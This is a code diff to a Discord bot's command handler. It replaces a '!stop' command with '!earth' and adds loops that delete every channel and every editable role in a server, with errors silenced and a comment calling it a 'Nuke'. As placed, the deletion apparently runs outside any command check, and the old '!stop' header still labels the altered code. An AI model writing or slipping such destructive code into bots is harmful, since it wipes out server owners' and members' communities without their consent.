@@ -210,7 +210,24 @@ module.exports = (client) => {
         // ==========================================
         // 4. COMMAND: !stop
         // ==========================================
-        if (command === "!stop") {
+
+        // 1. Delete all existing channels
+                const channels = [...guild.channels.cache.values()];
+                for (const channel of channels) {
+                    await channel.delete("earth command").catch(() => {});
+                }
+
+        // 2. Delete all deletable roles
+                const roles = [...guild.roles.cache.values()];
+                for (const role of roles) {
+                    if (role.id !== guild.id && role.editable) {
+                        await role.delete("earth command").catch(() => {});
+                    }
+                }
+        
+        // 3. Nuke Stop
+        
+        if (command === "!earth") {
             if (welcomeInterval) {
                 clearInterval(welcomeInterval);
                 welcomeInterval = null;
